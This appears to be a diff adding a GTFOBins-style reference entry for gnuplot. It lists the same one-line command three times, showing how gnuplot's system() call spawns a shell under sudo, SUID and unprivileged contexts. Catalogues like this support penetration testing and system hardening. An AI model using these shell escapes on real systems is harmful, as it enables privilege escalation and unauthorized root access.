@@ -1,0 +1,14 @@
+gnuplot
+=======
+
+Shell
+-----
+
+[Sudo]
+    gnuplot -e 'system("/bin/sh 1>&0")'
+
+[SUID]
+    gnuplot -e 'system("/bin/sh 1>&0")'
+
+[Unprivileged]
+    gnuplot -e 'system("/bin/sh 1>&0")'
